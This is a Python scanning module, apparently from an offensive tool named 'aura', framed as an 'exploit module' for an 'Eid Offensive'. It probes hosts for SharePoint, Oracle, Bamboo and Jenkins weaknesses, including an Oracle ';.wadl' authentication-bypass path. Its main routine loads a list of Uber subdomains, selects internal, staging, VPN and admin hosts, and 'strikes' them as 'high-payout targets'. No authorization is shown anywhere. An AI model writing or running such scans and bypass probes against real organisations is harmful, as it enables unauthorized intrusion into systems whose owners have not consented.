import asyncio
import httpx
import json
import os
from aura.ui.formatter import console

class EidOffensive:
    """
    High-impact exploit module for the Eid Offensive.
    Targets: SharePoint RCE, Oracle WebLogic RCE, Bamboo RCE.
    """
    
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }

    async def check_sharepoint_rce(self, url):
        """
        CVE-2026-20963: Microsoft SharePoint Unauthenticated RCE
        Attempts to detect vulnerable SharePoint versions and deserialization endpoints.
        """
        endpoints = [
            "/_vti_bin/lists.asmx",
            "/_vti_bin/WebPartPages.asmx",
            "/_api/web/lists",
            "/_vti_pvt/service.cnf"
        ]
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                for path in endpoints:
                    try:
                        r = await client.get(f"{url}{path}", headers=self.headers)
                        if r.status_code in [200, 401, 500]:
                            console.print(f"  [yellow][!] Potential SharePoint Target: {url}{path}[/yellow]")
                            return True
                    except: continue
        except Exception: pass
        return False

    async def check_oracle_rce(self, url):
        """
        CVE-2026-21992: Oracle Fusion Middleware Unauthenticated RCE
        Utilizes the ;.wadl suffix bypass for Identity Manager.
        """
        bypass_paths = [
            "/iam/im/rest/v1/Users;.wadl",
            "/iam/im/config;.wadl",
            "/registry/wadl;.wadl"
        ]
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                for path in bypass_paths:
                    try:
                        r = await client.get(f"{url}{path}", headers=self.headers)
                        if r.status_code in [200, 403, 500] and ("application/xml" in r.headers.get("Content-Type", "").lower() or "application/vnd.sun.wadl+xml" in r.headers.get("Content-Type", "").lower()):
                            console.print(f"  [bold green][!!] CRITICAL: Oracle FM Bypass Confirmed at {url}{path}[/bold green]")
                            return True
                    except: continue
        except Exception: pass
        return False

    async def check_atlassian_bamboo(self, url):
        """
        CVE-2026-21570: Atlassian Bamboo RCE (CVSS 8.6)
        Checks for Bamboo version in headers or footprint.
        """
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                r = await client.get(f"{url}/allPlans.action", headers=self.headers)
                if "Atlassian-Bamboo" in r.headers.get("Server", "") or "bamboo" in r.text.lower():
                    r_info = await client.get(f"{url}/rest/api/latest/info", headers=self.headers)
                    version = r_info.json().get("version", "Unknown") if r_info.status_code == 200 else "Unknown"
                    console.print(f"  [yellow][!] Bamboo Detected: {url} (Version: {version})[/yellow]")
                    return True
        except Exception: pass
        return False

    async def check_jenkins(self, url):
        """
        Detects Jenkins version and potential vulnerability indicators.
        """
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                r = await client.get(url, headers=self.headers)
                jenkins_v = r.headers.get("X-Jenkins")
                if jenkins_v or "jenkins" in r.text.lower():
                    version = jenkins_v if jenkins_v else "Unknown"
                    console.print(f"  [yellow][!] Jenkins Detected: {url} (Version: {version})[/yellow]")
                    return True
        except Exception: pass
        return False

    async def run_strike(self, target_list):
        console.print("[bold cyan]💀 EID OFFENSIVE: STRIKING HIGH-PAYOUT TARGETS[/bold cyan]")
        console.print(f"[*] Processing {len(target_list)} targets...")
        
        output_file = r"c:\Users\User\.gemini\antigravity\scratch\aura\reports\eid_offensive_hits.json"
        results = []
        
        for target in target_list:
            domain = target.get("domain")
            if not domain: continue
            url = f"https://{domain}"
            
            # Check for version and common indicators
            hit_type = None
            if await self.check_sharepoint_rce(url): hit_type = "SharePoint"
            elif await self.check_oracle_rce(url): hit_type = "Oracle"
            elif await self.check_atlassian_bamboo(url): hit_type = "Bamboo"
            elif await self.check_jenkins(url): hit_type = "Jenkins"
            
            if hit_type:
                hit_data = {**target, "url": url, "vulnerability": hit_type}
                results.append(hit_data)
                # Incremental save
                with open(output_file, "w") as f:
                    json.dump(results, f, indent=4)
                console.print(f"  [bold green][!!] HIT CONFIRMED: {url} ({hit_type})[/bold green]")
        
        console.print(f"\n[bold green][+] Strike Complete. Found {len(results)} potential critical targets.[/bold green]")
        return results

if __name__ == "__main__":
    scanner = EidOffensive()
    subdomain_file = r"c:\Users\User\.gemini\antigravity\scratch\aura\reports\reachable_uber_subdomains.json"
    
    if os.path.exists(subdomain_file):
        with open(subdomain_file, "r") as f:
            targets = json.load(f)
        
        # Filter for interesting keywords to prioritize
        keywords = ["oracle", "sharepoint", "bamboo", "internal", "staging", "dev", "test", "iam", "vpn", "admin"]
        interesting_targets = [t for t in targets if any(k in t["domain"].lower() for k in keywords)]
        
        # If too many, take a reasonable subset for demonstration, or run all if safe
        # Let's run all interesting ones
        final_targets = interesting_targets if interesting_targets else targets[:100]
        
        # Run and save results are handled inside run_strike via incremental save
        asyncio.run(scanner.run_strike(final_targets))
    else:
        console.print("[red]Subdomain file not found.[/red]")
